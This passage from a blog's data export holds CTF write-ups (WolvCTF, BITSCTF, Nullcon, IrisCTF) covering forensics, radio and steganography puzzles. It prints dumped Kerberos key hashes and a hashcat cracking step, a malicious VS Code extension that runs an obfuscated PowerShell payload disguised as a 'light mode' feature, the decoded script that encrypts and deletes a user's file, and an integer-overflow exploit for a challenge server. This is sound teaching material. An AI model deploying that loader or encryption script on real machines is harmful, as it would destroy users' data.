s-cbc-md5:73522c0170f120c1wolvctf.corp\\jessica:aes256-cts-hmac-sha1-96:8088cf6ebf4fae379d3d8cf0689e60d6c0f6f6aed5a69946d93418ea4962de68wolvctf.corp\\jessica:aes128-cts-hmac-sha1-96:8df17274caccb4e4ef84b0195669c842wolvctf.corp\\jessica:des-cbc-md5:19daa74645e398bawolvctf.corp\\frank:aes256-cts-hmac-sha1-96:3dc99ada65b1bf26e6211c01dccaa3a87349afa35172c818a1e39ab6e1dd4035wolvctf.corp\\frank:aes128-cts-hmac-sha1-96:96d28a2a24a9a5fdadb6b31c7eab64bdwolvctf.corp\\frank:des-cbc-md5:1c6d2cad9e3dfd8cwolvctf.corp\\chris:aes256-cts-hmac-sha1-96:725f11a59f1c77f6ff41dd745cfc36e5229d09f271f471f9c52d7ed97793101awolvctf.corp\\chris:aes128-cts-hmac-sha1-96:9d963b6be441bf2652dd4bc351415bedwolvctf.corp\\chris:des-cbc-md5:2ca2e983e632e5bawolvctf.corp\\renee:aes256-cts-hmac-sha1-96:0ecee7ab365fd5a38999fae2ed19d3f02a9ed51e5987227023316ed8f19c77a2wolvctf.corp\\renee:aes128-cts-hmac-sha1-96:9e94283c417a8abe8f7752564b251051wolvctf.corp\\renee:des-cbc-md5:a1e69b1f1afef42awolvctf.corp\\peter:aes256-cts-hmac-sha1-96:9558878dce8606d877c804dbbfea9cc42e0d4903f46158f5d8fd804c4a4dd5c2wolvctf.corp\\peter:aes128-cts-hmac-sha1-96:9e86af0d3775c494cdffa0be7190b030wolvctf.corp\\peter:des-cbc-md5:0867d54016ba0704wolvctf.corp\\dan:aes256-cts-hmac-sha1-96:f55a42a6f1784346962ff1c1e53c6e8384be32bcc781d90c4c8a1227dda3aebcwolvctf.corp\\dan:aes128-cts-hmac-sha1-96:9579003b132f9d68609107529450c919wolvctf.corp\\dan:des-cbc-md5:467cfb4a9dec7c46wolvctf.corp\\jake:aes256-cts-hmac-sha1-96:f166119ffe48d3f1bd6cce6cfe796045943d6e161d9b864ef2668dbb0f83003bwolvctf.corp\\jake:aes128-cts-hmac-sha1-96:fb335f8432d5caf9b5250568c6457122wolvctf.corp\\jake:des-cbc-md5:54917531317aec83[*] Cleaning up... Where we can find the NTLM hash for jessica so we create a custom wordlist for the flag using the know prefix and I used cities.txt for the cities part to create the custom wordlist for brute force using hashcat. 12$ hashcat --show -m 1000 8fcdcffba18f392df7aa291527290aff wordlistx.txt8fcdcffba18f392df7aa291527290aff:wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125; And with the attacker gets Admin access and we get our last flag. Flag 3: 1wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125; Flags and Conclusion123wctf&#123;d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?&#125;wctf&#123;asr3pr04st3d?_sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_d0nt_us3_4ll3xtendedr1ghts&#125;wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125; Overall I really enjoyed this challenge series and a big shoutout to @dree for creating such fun challenges. The challenge helps in learn a lot about Kerboros, WinPEAS, NTDS and many other things. PasswordsA fairly simply challenge where we are given a .kdbx file and all we had to was brute force the keepass password using rockoyu.txt to get password as goblue1 and then just opening the file gives us the flag. Flag: 1wctf&#123;1_th0ught_1t_w4s_s3cur3?&#125; BreakoutAnother simple challenge where Stegseek on the given breakout.jpg reveals breakout.ch8 file file which on some googling turns out to be a chip8 game. 123456$ stegseek --crack breakout.jpg rockyou.txtStegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: &quot;&quot;[i] Original filename: &quot;breakout.ch8&quot;.[i] Extracting to &quot;breakout.jpg.out&quot;. So on loading this file in an online CHIP-8 emulator we get a game and as soon as we complete the game we are given the flag. Flag: 1WCTF&#123;GAME_OVER_VMASBKLTNUFMGS&#125;","tags":[{"name":"Forensics","slug":"Forensics","permalink":"http://w1r3w01f.github.io/tags/Forensics/"},{"name":"DFIR","slug":"DFIR","permalink":"http://w1r3w01f.github.io/tags/DFIR/"},{"name":"Steganography","slug":"Steganography","permalink":"http://w1r3w01f.github.io/tags/Steganography/"},{"name":"File Analysis","slug":"File-Analysis","permalink":"http://w1r3w01f.github.io/tags/File-Analysis/"}],"categories":[{"name":"CTF-Writeups","slug":"CTF-Writeups","permalink":"http://w1r3w01f.github.io/categories/CTF-Writeups/"}]},{"title":"BITSCTF-2025","date":"2025-02-08T18:30:00.000Z","path":"2025/02/09/BITSCTF-2025/","text":"I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition. ForensicsFinders KeepersChallenge DescriptionAnother simple steganography challenge where we are initially given a .png file. SolutionThe given png has a .jpeg and a .wav file embedded in itself which we can find by the hex analysis and then extract the file using byte scraping to get the following two files. ImageAudio The audio file on opening in audacity immediately shows the profile of a morse code so we use this online tool (https://morsecode.world/international/decoder/audio-decoder-adaptive.html) to decode the morse code and get its message as snooooooppppppp, which happens to be the steghide passphrase for the extracted jpeg file and it gives us our flag. Flag: 1BITSCTF&#123;1_4m_5l33py_1256AE76&#125; AutoBots Unite!Challenge DescriptionWe are given a chall.dwg file with following description: “Mr. Douglas Adams is so sick and tired of old people using the same encryption methods again and again.” SolutionInital searches reveal that a .dwg file is a 2D or 3D drawing created with Autodesk AutoCAD so we can open the file in AutoDesk Online here (https://viewer.autodesk.com/designviews). On opening the file here we get a really absurd looking image of some sort of barcode. Initially I tried various different approaches of finding some differences in the lines color shades or the inter-line distances but at the end it turned out that the flag was embedded in the lengths of the lines. All lines had lengths of type 42.xxx or 43.xxx so if we do round((length-42)*100) we get ASCII codes which on decoding initially gives some garbish but eventually reveals our flag. Flag: 1BITSCTF&#123;b4rc0d3s_4r3_0v3r4t3d_4sf_h3h3_0k1md0n3&#125; SymphoniesChallenge DescriptionWe are presented with a midi file (though corrupted) and our target is to decode its message. SolutionInital searches reveal that a .midi file varies from MP3 or WAV files as it is not a waveform. This means that it inherently produces no audio signal. MIDI files contain messages that communicate to software instruments (or connected hardware gear) what to play. These messages include: Note-on/off: Note on signifies the start of a specific keyboard note; note-off signifies the end of a note. Velocity value: High values lead to a louder volume for that note as well as possible articulation differences; low values lead to lower volumes for the note. Pitch bend: Controls pitch alterations up or down a semitone (often linked to pitch bend wheels). Initially the magic bytes of the given file are corrupted which we can quickly fix to the correct bytes 4D 54 68 64 to fix the .midi file which we can now load in (https://signal.vercel.app/edit) for its visualisation. Immediately what catches our eye is all the velocities lie below 127 so these may represent an ASCII code so we write the following code to get and decode both the file’s velocites and the notes which then because are 2 strings of similar lengths we try to XOR them as our first option and that just happends to be the correct solution to get our flag. 123456789101112131415import midomidi = mido.MidiFile(&#x27;Demo2.midi&#x27;)velocities = &#x27;&#x27;notes=&#x27;&#x27;for msg in midi: if not msg.is_meta and msg.type == &#x27;note_on&#x27;: velocities = velocities + chr(msg.velocity) notes = notes + chr(msg.note)notes = list(map(int,notes.split()))notes = notes[:len(velocities)]result = &#x27;&#x27;.join(chr(a ^ ord(b)) for a, b in zip(notes, velocities))print(result.encode()) Flag: 1BITSCTF&#123;y0u_7h0u6h7_y0u_c0uld_6u355_7h15?!_qrtd434&#125; Hardware&#x2F;RF%ulationChallenge DescriptionWe are given a complex signal file in this challenge and the name obviously hint to some sort of modulation of the signal is involved. SolutionFairly straight forward challenge where all we had to do was open the file in Universal Radio Hacker (https://github.com/jopohl/urh) and it does all the job for us and immediately spit out the flag. Flag: 1BITSCTF&#123;A_br13f_4nd_g3ntl3_1ntr0duc710n_70_r4di0_h4ck1ng_c5c33558&#125; Old SkoolChallenge DescriptionWe are given a .iq file with the following description:“I remember my father talking about those old age radios and how they work. Pretty cool if you ask me. Also he told me about a radio channel which had a frequency between 1500-1599khz from PHILIPPINES. Note: Sampling Rate for the file is 24kHz” SolutionWe are given a .iq file, which are standard RF signal files wherein the Sampling rate of given file being 24 khz and the freq range of the radio channel used to transmit being of range 1500-1599 kHz immediately tells its a challenge of Frequency Modulation or downsampling. Now being an ECE student I decided to do signal analysis using MATLAB just to be old school and justify the challenge name. The process I followed was to first read the iq and interpret it as complex signals that they are I+jQ where I is the In-phase component and Q is the Quadrature-phase component. Then perform signal mixing to make it baseband and remove the DC components. Finally add a band-pass (butterworth) filter on top. 12345678910111213141516171819202122clc; clear; close all;filename = &#x27;\\modulated.iq&#x27;;fs = 24000;fid = fopen(filename, &#x27;rb&#x27;);raw_data = fread(fid, &#x27;float32&#x27;); iq_data = complex(raw_data(1:2:end), raw_data(2:2:end));t = (0:length(iq_data)-1) / fs;f_station = 1566000;shifted_signal = iq_data .* exp(-1j * 2 * pi * f_station * t.&#x27;);am_signal = abs(shifted_signal);am_signal = am_signal - mean(am_signal);am_signal = am_signal / max(abs(am_signal));fc = 5000;[b, a] = butter(5, fc/(fs/2));filtered_audio = filter(b, a, am_signal);audiowrite(&#x27;radio_audio.wav&#x27;, filtered_audio, fs);sound(filtered_audio, fs); Extracted Audio Flag: 1BITSCTF&#123;welcome_to_our_radio_enjoy_our_song_collection&#125; DFIRViruS Camp 1Challenge DescriptionWe are given an artifact file dimp.ad1 and the description says to decode the encrypted flag file. SolutionOn initial analysis of the given artifacts file in FTK Imager we find a peculiar file extension.js which appears to be the malware in question responsible for flag encryption. So the challenge was basically around a malicious extension of VS-Code which encrypted the user’s flag image which was to be decoded. Given below is the extension.js. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&quot;use strict&quot;;var __createBinding = (this &amp;&amp; this.__createBinding) || (Object.create ? (function(o, m, k, k2) &#123; if (k2 === undefined) k2 = k; var desc = Object.getOwnPropertyDescriptor(m, k); if (!desc || (&quot;get&quot; in desc ? !m.__esModule : desc.writable || desc.configurable)) &#123; desc = &#123; enumerable: true, get: function() &#123; return m[k]; &#125; &#125;; &#125; Object.defineProperty(o, k2, desc);&#125;) : (function(o, m, k, k2) &#123; if (k2 === undefined) k2 = k; o[k2] = m[k];&#125;));var __setModuleDefault = (this &amp;&amp; this.__setModuleDefault) || (Object.create ? (function(o, v) &#123; Object.defineProperty(o, &quot;default&quot;, &#123; enumerable: true, value: v &#125;);&#125;) : function(o, v) &#123; o[&quot;default&quot;] = v;&#125;);var __importStar = (this &amp;&amp; this.__importStar) || (function () &#123; var ownKeys = function(o) &#123; ownKeys = Object.getOwnPropertyNames || function (o) &#123; var ar = []; for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k; return ar; &#125;; return ownKeys(o); &#125;; return function (mod) &#123; if (mod &amp;&amp; mod.__esModule) return mod; var result = &#123;&#125;; if (mod != null) for (var k = ownKeys(mod), i = 0; i &lt; k.length; i++) if (k[i] !== &quot;default&quot;) __createBinding(result, mod, k[i]); __setModuleDefault(result, mod); return result; &#125;;&#125;)();Object.defineProperty(exports, &quot;__esModule&quot;, &#123; value: true &#125;);exports.activate = activate;exports.deactivate = deactivate;const vscode = __importStar(require(&quot;vscode&quot;));const child_process_1 = require(&quot;child_process&quot;);const fs = __importStar(require(&quot;fs&quot;));function activate(context) &#123; const command = vscode.commands.registerCommand(&quot;rs&quot;, () =&gt; &#123; const scriptContent = `$wy7qIGPnm36HpvjrL2TMUaRbz = &quot;K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ&quot; ;$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2&gt;&amp;1&gt; $null ;$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng(&quot;$9U5RgiwHSYtbsoLuD3Vf6&quot;)) ;$9ozWfHXdm8eIBYru = &quot;InV&quot;+&quot;okE&quot;+&quot;-ex&quot;+&quot;prE&quot;+&quot;SsI&quot;+&quot;ON&quot; ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`; const scriptPath = `C:\\\\Users\\\\vboxuser\\\\AppData\\\\Local\\\\Temp\\\\temp0001`; try &#123; fs.writeFileSync(scriptPath, scriptContent); vscode.window.showInformationMessage(`The light mode will activate in a few minutes.`); &#125; catch (error) &#123; vscode.window.showErrorMessage(`Error activating light mode.`); &#125; (0, child_process_1.exec)(`powershell.exe -ExecutionPolicy Bypass -File &quot;$&#123;scriptPath&#125;&quot;`, (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.error(`Error: $&#123;error.message&#125;`); &#125; if (stderr) &#123; console.error(`Stderr: $&#123;stderr&#125;`); &#125; console.log(`Stdout: $&#123;stdout&#125;`); &#125;); &#125;); context.subscriptions.push(command);&#125;// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9function deactivate() &#123; &#125;//# sourceMappingURL=extension.js.map The first flag was fairly staright forward it was just b64 encoded and commented in the end of the above code so we got out first flag. 12$ echo &quot;VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9&quot; | base64 -dThe 1st flag is: BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125; Flag: 1BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125; ViruS Camp 2Challenge DescriptionFollow up to the first challenge wherein now we need to decode the encryption methodology and decode the flag.enc we get from the same .ad1 file. SolutionOn simple deobfuscation of the extension we get that it executed the following powershell script for the encryption. 123456789101112131415161718192021222324252627282930313233$password = &quot;MyS3cr3tP4ssw0rd&quot;$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)$iterations = 10000$keySize = 32 $ivSize = 16 $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)$key = $deriveBytes.GetBytes($keySize)$iv = $deriveBytes.GetBytes($ivSize)$inputFile = &quot;C:\\\\Users\\\\vboxuser\\\\Desktop\\\\flag.png&quot;$outputFile = &quot;C:\\\\Users\\\\vboxuser\\\\Desktop\\\\flag.enc&quot;$aes = [System.Security.Cryptography.Aes]::Create()$aes.Key = $key$aes.IV = $iv$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7$encryptor = $aes.CreateEncryptor()$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)$cryptoStream.FlushFinalBlock()$cryptoStream.Close()$outStream.Close()Remove-Item $inputFile -Force So we write a reversing script in order to decode the flag.enc and get back the flag.png 123456789101112131415161718192021222324252627282930import hashlibimport osfrom Crypto.Cipher import AESfrom Crypto.Protocol.KDF import PBKDF2password = &quot;MyS3cr3tP4ssw0rd&quot;.encode()salt = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08])iterations = 10000key_size = 32iv_size = 16key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)key = key_iv[:key_size]iv = key_iv[key_size:key_size + iv_size]input_file = &quot;flag.enc&quot;output_file = &quot;flag.png&quot;with open(input_file, &quot;rb&quot;) as f: encrypted_data = f.read()cipher = AES.new(key, AES.MODE_CBC, iv)decrypted_data = cipher.decrypt(encrypted_data)pad_len = decrypted_data[-1]decrypted_data = decrypted_data[:-pad_len]with open(output_file, &quot;wb&quot;) as f: f.write(decrypted_data)print(f&quot;Decryption successful: &#123;output_file&#125; restored.&quot;) Flag: 1BITSCTF&#123;h0pe_y0u_enj0yed_th1s_145e3f1a&#125;","tags":[{"name":"Forensics","slug":"Forensics","permalink":"http://w1r3w01f.github.io/tags/Forensics/"},{"name":"DFIR","slug":"DFIR","permalink":"http://w1r3w01f.github.io/tags/DFIR/"},{"name":"RF","slug":"RF","permalink":"http://w1r3w01f.github.io/tags/RF/"},{"name":"Steganography","slug":"Steganography","permalink":"http://w1r3w01f.github.io/tags/Steganography/"},{"name":"File Analysis","slug":"File-Analysis","permalink":"http://w1r3w01f.github.io/tags/File-Analysis/"}],"categories":[{"name":"CTF-Writeups","slug":"CTF-Writeups","permalink":"http://w1r3w01f.github.io/categories/CTF-Writeups/"}]},{"title":"Nullcon 2025","date":"2025-02-01T18:30:00.000Z","path":"2025/02/02/Nullcon-2025/","text":"I participated in Nullcon 2025, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition. MiscAncient PaperChallenge DescriptionWe are given an image file along the following description: “I found this ancient artifact stuck in an old machine labeled “29”. But what is its purpose?” SolutionInitial inspection leads to the conclusion that the image is of an IBM-29 punch card which was carrying our flag as its data. Decoding the flagThen I used the following mapping of the IBM-29 punch card to decode the data. Which lead to the following text: 11337 FORMAT ENO H0LL3R1TH 3NC0D3D F0RTR4N PRINT 1337 And hence we get our flag as: Flag: 1ENO&#123;H0LL3R1TH_3NC0D3D_F0RTR4N&#125; DrivingChallenge DescriptionWe are given a strange video (.mp4) of a “banana driving a Car xD”. SolutionOn extracting the frames of the video using the frames per second rates of 30 fps we get 387 frames. 1ffmpeg -i driving.mp4 -vf &quot;fps=30&quot; frame_%04d.png Also the Artist in the video’s metadata looks like a hint for the challenge. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970$ exiftool driving.mp4ExifTool Version Number : 12.40File Name : driving.mp4Directory : .File Size : 2.2 MiBFile Modification Date/Time : 2025:02:01 14:06:53+05:30File Access Date/Time : 2025:02:02 18:56:35+05:30File Inode Change Date/Time : 2025:02:01 14:06:57+05:30File Permissions : -rwxrwxrwxFile Type : MP4File Type Extension : mp4MIME Type : video/mp4Major Brand : MP4 v2 [ISO 14496-14]Minor Version : 0.0.0Compatible Brands : mp42, mp41Movie Header Version : 0Create Date : 2025:01:12 15:35:52Modify Date : 2025:01:12 15:35:52Time Scale : 90000Duration : 12.93 sPreferred Rate : 1Preferred Volume : 100.00%Preview Time : 0 sPreview Duration : 0 sPoster Time : 0 sSelection Time : 0 sSelection Duration : 0 sCurrent Time : 0 sNext Track ID : 3Track Header Version : 0Track Create Date : 2025:01:12 15:35:52Track Modify Date : 2025:01:12 15:35:52Track ID : 1Track Duration : 12.90 sTrack Layer : 0Track Volume : 0.00%Image Width : 640Image Height : 480Graphics Mode : srcCopyOp Color : 0 0 0Compressor ID : hvc1Source Image Width : 640Source Image Height : 480X Resolution : 72Y Resolution : 72Compressor Name : HEVC CodingBit Depth : 24Video Frame Rate : 30Matrix Structure : 1 0 0 0 1 0 0 0 1Media Header Version : 0Media Create Date : 2025:01:12 15:35:52Media Modify Date : 2025:01:12 15:35:52Media Time Scale : 44100Media Duration : 12.93 sMedia Language Code : engBalance : 0Handler Description : Alias Data HandlerAudio Format : mp4aAudio Channels : 2Audio Bits Per Sample : 16Audio Sample Rate : 44100Handler Type : MetadataXMP Toolkit : Image::ExifTool 13.00Artist : 2+(10*n) for all n&gt;=10Media Data Size : 2271847Media Data Offset : 12469Image Size : 640x480Megapixels : 0.307Avg Bitrate : 1.41 MbpsRotation : 0 Now on a simple inspection of the frames, one thing that catches our eye is the presence of &#125; in the frame number 383 (indexing from 1). Then by the Artist hint on inspecting frames on intervals of 10 i.e the following frames,[103,113,123,133,143,153,163,173,183,193,203,213,223,233,243,253,263,273,283,293,303,313,323,333,343,353,363,373,383]we find that each of those frames contain one character of the flag in the following order Left Top → Right Top → Right Bottom → Left Bottom → Left Top…, which leads us to our flag. Flag: 1ENO&#123;Y0U_4R3_DR1V1N6_M3_CR4ZY&#125; PowerplayChallenge DescriptionAn interactive challenge where we are given the python code for the challenge and our job is to trick the server to reveal the flag. SolutionOn initial inspection of the code, we can find the vulnerability in it, 12345678910111213141516171819202122232425262728import numpy as npfrom secret import flag, quotesprizes = quotes + [&#x27;missingno&#x27;] * 4 + [flag] * 24if __name__ == &#x27;__main__&#x27;: print(&#x27;Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!\\n&#x27;) player_count = int(input(&#x27;How many players participate?\\n&#x27;)) power = np.zeros(player_count, dtype = np.int32) for i in range(player_count): power[i] = int(input(f&#x27;Player &#123;i&#125;, how strong are you right now?\\n&#x27;)) ready = False while True: print(&#x27;What do you want to do?\\n1) pump up\\n2) cash in&#x27;) option = int(input()) if option == 1: power = power**2 ready = True elif option == 2: if not ready: raise Exception(&#x27;Nope, too weak&#x27;) for i in range(player_count): if power[i] &lt; len(quotes): print(f&#x27;You got an inspiration: &#123;prizes[power[i]]&#125;&#x27;) exit() else: raise Exception(&#x27;What?&#x27;) The code creates the power as a numpy array of 32 bit signed integer type and then, the pump option lets us square the power array and the check is just if the power value is less than the length of quotes (positive) so one can cause integer overflow in power value to make it negative on squaring but there is one more catch that as the prizes has [flag]*24 we need to specifically make power in the range (-23 to -1) so that we bypass the check and access the prizes array at an index where the flag is present which is one out of the last 24 cells, so we write a brute force script to get such a number. 1234567891011121314151617181920import numpy as npstart = 1000001end = 100000000max_iter = 10lower_bound = -24upper_bound = -1for i in range(start, end + 1): if i % 100000 == 0: print(f&#x27;&#123;i = &#125;&#x27;) a = np.int32(i) ctr = 0 while ctr &lt; max_iter: a = a ** 2 ctr += 1 if int(a) &gt; lower_bound and int(a) &lt;= upper_bound: print(f&quot;Found: i = &#123;i&#125;, iterations = &#123;ctr&#125;, value = &#123;a&#125;&quot;) break This gives first valid solution as 34716455 1 -15, and on using this as our input we get our flag. 123456789101112131415Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!How many players participate?1Player 0, how strong are you right now?34716455What do you want to do?1) pump up2) cash in1What do you want to do?1) pump up2) cash in2You got an inspiration: ENO&#123;d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve&#125; Flag: 1ENO&#123;d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve&#125; Profound thoughtChallenge DescriptionWe are given a .png file, and this happened to be the easiest challenge of the CTF. SolutionA simple LSB steganography challenge, just use zsteg on the file and we get our flag. 1234567891011$ zsteg l5b245c11.pngimagedata .. text: &quot;286-0.\\t\\n\\t&quot;b1,r,lsb,xy .. text: &quot;rzsZA&gt;FCNR^_]\\&quot;&quot;b1,r,msb,xy .. file: OpenPGP Public Keyb1,g,msb,xy .. file: OpenPGP Secret Keyb1,rgb,lsb,xy .. text: &quot;ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; ENO&#123;57&quot;b2,r,msb,xy .. file: OpenPGP Secret Keyb2,bgr,msb,xy .. file: OpenPGP Public Keyb3,r,msb,xy .. file: RLE image data, 16888 x 4242, lower left corner: 8321, clear first, 16 color channelsb4,r,lsb,xy .. text: &quot;wYtE$ER\\#$DUEFuREEf2E%5&quot;b4,g,lsb,xy .. text: &quot;#\\&quot;5DQ232UT2&quot; Flag: 1ENO&#123;57394n09r4phy_15_w4y_c00l3r_7h4n_p0rn06r4phy&#125; USBnetChallenge DescriptionWe are given a packet capture of USB packtes. SolutionOn initial analysis of the .pcapng in Wireshark we observe that packet 170 contains the PNG magic bytes of a .png image and it also has the IEND chunk meaning the complete image was transferred in this packet so we just try to reconstruct the image from this packet using Cyberchef which gives the QR of our flag. Flag: 1ENO&#123;USB_ETHERNET_ADAPTER_ARE_COOL_N!C3&#125; abroad study notesChallenge DescriptionWe are given a corrupted jpeg image which looks like its data streams are scratched. SolutionNow from the JPEG documentation we find,“If a 0xff byte occurs in the compressed image data either a zero byte (0x00) or a marker identifier follows it. Normally the only marker that should be found once the image data is started is an EOI. When a 0xff byte is found followed by a zero byte (0x00) the zero byte must be discarded.”So on inspecting the given jpeg we find it has ff 07 markers causing the distortion so we just fix them to ff 00 and our jpeg restores to original one. Documentation to refer: jpeg-format-layout Flag: 1ENO&#123;o7_t0_4ll_r3pl4c3d_07&#125;","tags":[{"name":"Forensics","slug":"Forensics","permalink":"http://w1r3w01f.github.io/tags/Forensics/"},{"name":"Steganography","slug":"Steganography","permalink":"http://w1r3w01f.github.io/tags/Steganography/"},{"name":"File Analysis","slug":"File-Analysis","permalink":"http://w1r3w01f.github.io/tags/File-Analysis/"},{"name":"Wireshark","slug":"Wireshark","permalink":"http://w1r3w01f.github.io/tags/Wireshark/"}],"categories":[{"name":"CTF-Writeups","slug":"CTF-Writeups","permalink":"http://w1r3w01f.github.io/categories/CTF-Writeups/"}]},{"title":"IrisCTF-2025","date":"2025-01-06T18:30:00.000Z","path":"2025/01/07/irisctf2025/","text":"I participated in IrisCTF 2025, organized by IrisSec, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some Forensics, Networking and RF challenges I was personally able to solve during the competition. ForensicsdeldeldelChallenge Description Source File: deldeldel.tar.gz SolutionWe are give a packet capture file for this challenge. On viewing it in Wireshark a stream of USB packets can be discoverd. The file name indicating a keylogger and the packets from ip 1.3.2 with Leftover Capture data that would be 8 byte strings made me believe for certain that its USB keyboard communicating with our host. Parsing USB CAP DataI used the following online Keyboard parser tool to parse the HID data and hence retrieve the flag. 1(https://github.com/5h4rrk/CTF-Usb_Keyboard_Parser/blob/main/Usb_Keyboard_Parser.py) 12345678w0lf@hp:~$ python3 Usb_Keyboard_Parser.py klogger.pcapng[-] Found Modifier in 310 packets [-][+] Using filter &quot;usb.capdata&quot; Retrived HID Data is :Hheey AAalicce! Ii tthink Ii&#x27;&#x27;m ssupppooseed too giivee yoou tiss fllaag:iriisctfF&#123;[tthis_akeyloggeer_iisS_too_hard_to_use&#125; Flag: 1irisctf&#123;this_keylogger_is_too_hard_to_use&#125; Windy DayChallenge Description SolutionWe are given a memory dump for this challenge. So 